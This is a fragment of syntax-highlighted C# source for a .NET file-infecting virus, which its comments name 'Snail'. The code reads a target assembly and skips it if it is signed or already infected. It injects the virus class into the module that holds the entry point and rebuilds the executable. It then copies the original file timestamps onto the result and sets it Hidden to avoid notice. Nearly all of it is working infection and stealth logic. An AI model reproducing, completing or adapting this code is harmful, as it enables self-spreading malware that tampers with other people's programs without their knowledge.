                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">resFileName</span><span class="sc10">))</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetCreationTime</span><span class="sc10">(</span><span class="sc11">resFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ctime</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetLastAccessTime</span><span class="sc10">(</span><span class="sc11">resFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">latime</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetLastWriteTime</span><span class="sc10">(</span><span class="sc11">resFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lwtime</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetAttributes</span><span class="sc10">(</span><span class="sc11">resFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAttributes</span><span class="sc10">.</span><span class="sc11">Hidden</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                    
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ThreadAbortException</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">e</span><span class="sc10">.</span><span class="sc11">Message</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc2">//                  Console.WriteLine(e.Message);
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">donotdel</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc6">"ILReader.dll"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">PEFileKinds</span><span class="sc0"> </span><span class="sc11">GetFileType</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">==</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">byte</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0x3c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Begin</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">peoffset</span><span class="sc10">=(</span><span class="sc16">uint</span><span class="sc10">)</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]|</span><span class="sc0">
                </span><span class="sc10">((</span><span class="sc16">uint</span><span class="sc10">)</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])&gt;&gt;</span><span class="sc4">8</span><span class="sc10">|</span><span class="sc0">
                </span><span class="sc10">((</span><span class="sc16">uint</span><span class="sc10">)</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">])&gt;&gt;</span><span class="sc4">16</span><span class="sc10">|</span><span class="sc0">
                </span><span class="sc10">((</span><span class="sc16">uint</span><span class="sc10">)</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">])&gt;&gt;</span><span class="sc4">24</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">peoffset</span><span class="sc10">+</span><span class="sc4">0x5c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Begin</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">PEFileKinds</span><span class="sc10">.</span><span class="sc11">ConsoleApplication</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">PEFileKinds</span><span class="sc10">.</span><span class="sc11">WindowApplication</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ProcessAssembly</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">AppDomain</span><span class="sc0"> </span><span class="sc11">ad</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">AssemblyName</span><span class="sc0"> </span><span class="sc11">an</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">AssemblyBuilder</span><span class="sc0"> </span><span class="sc11">ab</span><span class="sc10">;</span><span class="sc0">         

            </span><span class="sc11">PEFileKinds</span><span class="sc0"> </span><span class="sc11">filetype</span><span class="sc10">=</span><span class="sc11">GetFileType</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc11">Objects</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Objects</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">ad</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">.</span><span class="sc11">Thread</span><span class="sc10">.</span><span class="sc11">GetDomain</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">an</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">AssemblyName</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">an</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetFileNameWithoutExtension</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">ab</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ad</span><span class="sc10">.</span><span class="sc11">DefineDynamicAssembly</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">an</span><span class="sc10">,</span><span class="sc0">  </span><span class="sc11">AssemblyBuilderAccess</span><span class="sc10">.</span><span class="sc11">RunAndSave</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">Assembly</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">LoadFrom</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">);</span><span class="sc0">
            
</span><span class="sc9">#if !INFECTSIGNED
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">asm</span><span class="sc10">.</span><span class="sc11">GetName</span><span class="sc10">().</span><span class="sc11">GetPublicKeyToken</span><span class="sc10">()!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc9">#if !MANAGEDRESOURCES
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ManagedResourcesPresent</span><span class="sc10">(</span><span class="sc11">asm</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                                
            </span><span class="sc11">Assembly</span><span class="sc0"> </span><span class="sc11">asm1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc2">//   .   Snail
</span><span class="sc0">            </span><span class="sc2">// add Snail class to result assembly
</span><span class="sc0">            </span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">modules</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">.</span><span class="sc11">GetModules</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">ModuleBuilder</span><span class="sc0"> </span><span class="sc11">mbmain</span><span class="sc10">=</span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">modules</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc11">mod</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">modules</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">ModuleBuilder</span><span class="sc0"> </span><span class="sc11">outmodb</span><span class="sc10">=</span><span class="sc11">ab</span><span class="sc10">.</span><span class="sc11">DefineDynamicModule</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mod</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc11">ModuleReader</span><span class="sc0"> </span><span class="sc11">reader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ModuleReader</span><span class="sc10">(</span><span class="sc11">mod</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">AssemblyProvider</span><span class="sc10">());</span><span class="sc0">

                </span><span class="sc2">// no global functions
</span><span class="sc0">                </span><span class="sc11">outmodb</span><span class="sc10">.</span><span class="sc11">CreateGlobalFunctions</span><span class="sc0"> </span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc2">//  
</span><span class="sc0">                </span><span class="sc2">// type research
</span><span class="sc0">                </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mod</span><span class="sc10">.</span><span class="sc11">GetTypes</span><span class="sc10">();</span><span class="sc0">
                
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// donot infect if one of types has same characteristics as Snail
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0">
                        </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">GetNestedTypes</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">
                        </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> 
                        </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">).</span><span class="sc11">Length</span><span class="sc10">==</span><span class="sc0">
                        </span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">).</span><span class="sc11">GetNestedTypes</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">
                        </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> 
                        </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">).</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                        </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">GetMethods</span><span class="sc10">().</span><span class="sc11">Length</span><span class="sc10">==</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">).</span><span class="sc11">GetMethods</span><span class="sc10">().</span><span class="sc11">Length</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">foreach</span><span class="sc10">(</span><span class="sc11">MethodBase</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">GetMethods</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">))</span><span class="sc0">
                        </span><span class="sc2">//      ,
</span><span class="sc0">                        </span><span class="sc2">//      
</span><span class="sc0">                        </span><span class="sc2">// if EP is in this module
</span><span class="sc0">                        </span><span class="sc2">// add viruse's classes 
</span><span class="sc0">                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">asm</span><span class="sc10">.</span><span class="sc11">EntryPoint</span><span class="sc10">==</span><span class="sc11">methodBase</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">mbmain</span><span class="sc10">=</span><span class="sc11">outmodb</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">modules1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">asm1</span><span class="sc10">.</span><span class="sc11">GetModules</span><span class="sc10">();</span><span class="sc0">
                            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc11">modules1</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">++)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc11">mod1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">modules1</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">];</span><span class="sc0">

                                </span><span class="sc11">ModuleReader</span><span class="sc0"> </span><span class="sc11">reader1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ModuleReader</span><span class="sc10">(</span><span class="sc11">mod1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">AssemblyProvider</span><span class="sc10">());</span><span class="sc0">

                                </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">types1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mod1</span><span class="sc10">.</span><span class="sc11">GetTypes</span><span class="sc10">();</span><span class="sc0">
                                

                                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type1</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">types1</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">==</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">))</span><span class="sc2">// || type1==typeof(Process))
</span><span class="sc0">                                        </span><span class="sc11">SetType</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmodb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">reader1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc2">//     Reflector.Disassembler 
</span><span class="sc0">                                    </span><span class="sc2">// if one of types is Reflector.Disassembler (for future versions)
</span><span class="sc0">                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">&gt;</span><span class="sc4">22</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">22</span><span class="sc10">)==</span><span class="sc6">"Reflector.Disassembler"</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc11">SetType</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmodb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">reader1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type1</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">types1</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">DefineMembers</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmodb</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type1</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">types1</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">==</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">))</span><span class="sc2">// || type1==typeof(Process))
</span><span class="sc0">                                        </span><span class="sc11">EmitType</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">reader1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">,</span><span class="sc0"> 
                                            </span><span class="sc11">filetype</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">&gt;</span><span class="sc4">22</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">22</span><span class="sc10">)==</span><span class="sc6">"Reflector.Disassembler"</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc11">EmitType</span><span class="sc10">(</span><span class="sc11">type1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">reader1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">,</span><span class="sc0"> 
                                                </span><span class="sc11">filetype</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc11">SetType</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmodb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">reader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">DefineMembers</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmodb</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc11">EmitType</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">reader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filetype</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#if MANAGEDRESOURCES
</span><span class="sc0">            </span><span class="sc5">try</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">CreateResources</span><span class="sc10">(</span><span class="sc11">asm</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">          
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ThreadAbortException</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
